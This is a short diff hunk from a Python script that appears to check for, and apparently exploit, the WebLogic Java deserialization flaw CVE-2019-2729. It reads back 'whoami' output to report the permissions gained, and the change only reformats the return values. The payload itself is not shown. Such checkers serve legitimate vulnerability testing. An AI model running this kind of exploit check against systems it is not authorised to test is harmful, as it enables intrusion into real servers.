@@ -3552,8 +3552,8 @@ def run(ip,port):
     time.sleep(1)
     r3 = requests.get('http://' + str(ip) + ':' + str(port) + '/_async/favicon.ico')
     if ((r1.status_code == 200) and 'uid' in r1.text) or ((r2.status_code == 202) and 'Vulnerable' in r3.text):
-        return True,str(ip)+":"+str(port),"weblogic has a JAVA deserialization vulnerability:CVE-2019-2729",'[+]Your current permission is:  {}'.format(r1.text.replace('whoami : \r\n', ''))
-    return False,None
+        return True, str(ip)+":"+str(port), "CVE_2019_2729", '[+]Your current permission is:  {}'.format(r1.text.replace('whoami : \r\n', ''))
+    return False,None,None,None
 
 if __name__ == '__main__':
     dip = sys.argv[1]
